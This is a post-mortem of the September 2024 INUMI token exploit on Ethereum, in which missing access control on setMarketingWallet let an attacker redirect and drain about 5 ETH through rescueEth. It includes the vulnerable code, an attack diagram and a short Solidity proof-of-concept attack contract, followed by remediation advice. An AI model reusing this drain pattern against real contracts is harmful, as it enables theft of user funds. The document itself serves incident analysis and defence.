# INUMI Token — setMarketingWallet + rescueEth Missing Access Control Analysis

| Field | Details |
|------|------|
| **Date** | 2024-09-13 |
| **Protocol** | INUMI Token |
| **Chain** | Ethereum |
| **Loss** | ~11,000 USD |
| **Attacker** | [0xd215ffaf0f85fb6f93f11e49bd6175ad58af0dfd](https://etherscan.io/address/0xd215ffaf0f85fb6f93f11e49bd6175ad58af0dfd) |
| **Attack Tx** | [0xbeef352f716973043236f73dd5104b9d905fd04b7fc58d9958ac5462e7e3dbc1](https://etherscan.io/tx/0xbeef352f716973043236f73dd5104b9d905fd04b7fc58d9958ac5462e7e3dbc1) |
| **Vulnerable Contract** | [0xdb27D4ff4bE1cd04C34A7cB6f47402c37Cb73459](https://etherscan.io/address/0xdb27D4ff4bE1cd04C34A7cB6f47402c37Cb73459) |
| **Attack Contract** | [0xd129D8C12f0e7aA51157D9e6cc3F7Ece2dc84ecD](https://etherscan.io/address/0xd129D8C12f0e7aA51157D9e6cc3F7Ece2dc84ecD) |
| **Root Cause** | No access control on setMarketingWallet() — any arbitrary address can set the marketing wallet and call rescueEth() |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-09/INUMI_exp.sol) |

---

## 1. Vulnerability Overview

The INUMI token contract (`0xdb27D4...`) had no `onlyOwner` access control on the `setMarketingWallet(address walletAddress)` function. The attacker called this function to set the marketing wallet to their own attack contract (`0xd129D8...`), then called `rescueEth()` to drain the approximately 5 ETH held by the contract. This is the same vulnerability pattern as the HANA Token exploit — a simple two-step attack that resulted in a loss of approximately $11,000 USD.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable pattern: no access control on setMarketingWallet
function setMarketingWallet(address walletAddress) external {
    // ❌ No onlyOwner — anyone can change the marketing wallet
    marketingWallet = walletAddress;
}

function rescueEth() external {
    // Sends ETH to the marketing wallet — redirected to attacker-specified address
    uint256 balance = address(this).balance;
    payable(marketingWallet).transfer(balance);  // ❌ Transfers to attacker's address
}

// ✅ Correct code: add onlyOwner access control
function setMarketingWallet(address walletAddress) external onlyOwner {  // ✅ Access control
    require(walletAddress != address(0), "Zero address");
    marketingWallet = walletAddress;
    emit MarketingWalletUpdated(walletAddress);
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: INUMI_decompiled.sol
contract INUMI {
    function setMarketingWallet(address p0) external {}  // ❌ Vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker (0xd215ff...)
  │
  ├─[1]─► Deploy AttackerC contract (0xd129D8...)
  │
  ├─[2]─► Call ITarget(0xdb27D4...).setMarketingWallet(address(AttackerC))
  │         └─► No access control → marketingWallet = 0xd129D8...
  │
  ├─[3]─► Call ITarget(0xdb27D4...).rescueEth()
  │         └─► balance = address(this).balance (~5 ETH)
  │               └─► payable(marketingWallet).transfer(balance)
  │                     └─► ETH → 0xd129D8... (AttackerC)
  │
  ├─[4]─► AttackerC → forward ETH to attacker (0xd215ff...)
  │
  └─[5]─► Total loss: ~11,000 USD
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface ITarget {
    function setMarketingWallet(address walletAddress) external;
    function rescueEth() external;
}

// 0xd129D8C12f0e7aA51157D9e6cc3F7Ece2dc84ecD
contract AttackerC {
    function attack() public payable {
        // [2] Set marketing wallet to attack contract (exploiting missing access control)
        ITarget(addr1).setMarketingWallet(address(this));

        // [3] rescueEth: transfers contract ETH to marketingWallet (attacker)
        ITarget(addr1).rescueEth();

        // [4] Forward drained ETH to attacker EOA
        (bool s, ) = attacker.call{value: address(this).balance}("");
    }

    fallback() external payable {}
    receive() external payable {}
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|------|
| **Vulnerability Type** | Missing Access Control |
| **Attack Technique** | Unauthorized setMarketingWallet + rescueEth Drain |
| **DASP Category** | Access Control |
| **CWE** | CWE-284: Improper Access Control |
| **Severity** | High |
| **Attack Complexity** | Low |

## 6. Remediation Recommendations

1. **Access control on admin functions**: Apply `onlyOwner` to all administrative functions including `setMarketingWallet()` and `rescueEth()`.
2. **Address change timelock**: Add a 24–48 hour timelock for changes to critical addresses such as the marketing wallet.
3. **Minimize ETH balance**: Regularly withdraw funds to avoid holding excessive ETH in the contract.
4. **Event monitoring**: Emit events on marketing wallet changes to enable immediate detection of abnormal modifications.

## 7. Lessons Learned

- **Repeated pattern**: Attacked on the same day as the HANA Token exploit, by the same attacker, using the identical pattern.
- **Admin function basics**: All `set*` family functions always require `onlyOwner` or role-based access control.
- **Danger of rescue functions**: Emergency withdrawal functions like `rescueEth()` become attack vectors without proper access control.